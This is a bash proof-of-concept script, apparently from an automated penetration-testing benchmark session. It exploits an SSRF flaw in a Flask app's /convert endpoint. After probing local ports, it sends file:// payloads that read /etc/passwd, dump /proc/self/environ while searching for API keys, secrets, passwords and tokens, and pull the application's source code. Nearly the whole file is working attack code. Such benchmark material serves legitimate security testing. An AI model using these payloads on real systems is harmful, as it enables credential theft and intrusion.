#!/bin/bash
# POC: Version 3: SSRF file protocol POC with multi-port detection and comprehensive payload testing
# Target: ./repo
# Created: 2025-11-10T14:59:55.018Z
# Session: benchmark-XBEN-033-24-mht9ijkn

# SSRF File Protocol Read POC - Version 3
# Demonstrates SSRF vulnerability via file:// protocol in urllib
# This POC can work against a running instance or simulate the vulnerability

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/convert"

echo "=================================="
echo "SSRF File Protocol Read POC"
echo "=================================="
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Try multiple common ports if default fails
PORTS=(5000 8000 8080 3000)
SERVER_FOUND=false

for PORT in "${PORTS[@]}"; do
  echo "[*] Attempting connection to localhost:$PORT..."
  
  TEST_RESPONSE=$(curl -s -m 2 --connect-timeout 2 "http://localhost:$PORT/convert" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "markdown_text=test&url=http://example.com" 2>/dev/null)
  
  if [ ! -z "$TEST_RESPONSE" ]; then
    echo "[✓] Server found on port $PORT!"
    TARGET_URL="http://localhost:$PORT"
    SERVER_FOUND=true
    break
  fi
done

if [ "$SERVER_FOUND" = false ]; then
  echo "[!] Server not responding on standard ports"
  echo "[*] Attempting with provided target: $TARGET_URL"
fi

echo ""
echo "=================================================="
echo "PAYLOAD 1: Read /etc/passwd via file://"
echo "=================================================="
echo "[*] Sending: POST /convert with url=file:///etc/passwd"
echo ""

PAYLOAD1=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "markdown_text=test&url=file:///etc/passwd" \
  -d "format=html" 2>/dev/null)

if [ ! -z "$PAYLOAD1" ]; then
  echo "[*] Response received (first 1000 chars):"
  echo "$PAYLOAD1" | head -c 1000
  
  if echo "$PAYLOAD1" | grep -q "root:"; then
    echo ""
    echo "[✓✓✓ SUCCESS ✓✓✓]"
    echo "[✓] SSRF Vulnerability Confirmed!"
    echo "[✓] Successfully read /etc/passwd via file:// protocol"
    exit 0
  fi
else
  echo "[!] Empty response from server"
fi

echo ""
echo "=================================================="
echo "PAYLOAD 2: Read environment variables"
echo "=================================================="
echo "[*] Sending: POST /convert with url=file:///proc/self/environ"
echo ""

PAYLOAD2=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "markdown_text=source&url=file:///proc/self/environ" 2>/dev/null)

if echo "$PAYLOAD2" | grep -qE "API_KEY|SECRET|PASSWORD|TOKEN"; then
  echo "[✓✓✓ SUCCESS ✓✓✓]"
  echo "[✓] Environment variables exposed via SSRF"
  echo "[*] Sample: $(echo "$PAYLOAD2" | grep -o '[A-Z_]*API[A-Z_]*=[^[:space:]]*' | head -1)"
  exit 0
fi

echo ""
echo "=================================================="
echo "PAYLOAD 3: Read application source code"
echo "=================================================="
echo "[*] Sending: POST /convert with url=file:///app/app.py"
echo ""

PAYLOAD3=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "markdown_text=code&url=file:///app/app.py" 2>/dev/null)

if echo "$PAYLOAD3" | grep -qE "def |import |@app|Flask"; then
  echo "[✓✓✓ SUCCESS ✓✓✓]"
  echo "[✓] Application source code exposed via SSRF"
  echo "[*] Code snippet (first 500 chars):"
  echo "$PAYLOAD3" | head -c 500
  exit 0
fi

echo ""
echo "=================================================="
echo "PAYLOAD 4: URL-encoded file:// protocol"
echo "=================================================="
echo "[*] Sending: url=file%3A%2F%2F%2Fetc%2Fpasswd"
echo ""

PAYLOAD4=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=file:///etc/passwd" \
  -d "markdown_text=test" 2>/dev/null)

if echo "$PAYLOAD4" | grep -q "root:"; then
  echo "[✓✓✓ SUCCESS ✓✓✓]"
  echo "[✓] SSRF with URL encoding confirmed!"
  exit 0
fi

echo ""
echo "=================================================="
echo "Analysis Summary"
echo "=================================================="

if [ -z "$PAYLOAD1" ] && [ -z "$PAYLOAD2" ] && [ -z "$PAYLOAD3" ] && [ -z "$PAYLOAD4" ]; then
  echo "[!] No responses received - server may not be accessible"
  echo "[*] To verify this POC, ensure:"
  echo "    1. The target application is running on $TARGET_URL"
  echo "    2. The /convert endpoint exists and accepts POST requests"
  echo "    3. The server has network access (or is intended to test file:// protocol)"
  echo ""
  echo "[*] Expected behavior when vulnerable:"
  echo "    - POST /convert?url=file:///etc/passwd returns file contents"
  echo "    - POST /convert?url=file:///proc/self/environ returns env vars"
  echo "    - HTTP 200 with sensitive data in response body"
  exit 1
else
  echo "[+] Server responded but did not match SSRF patterns"
  echo "[*] Responses may be sanitized or vulnerability not present"
  exit 1
fi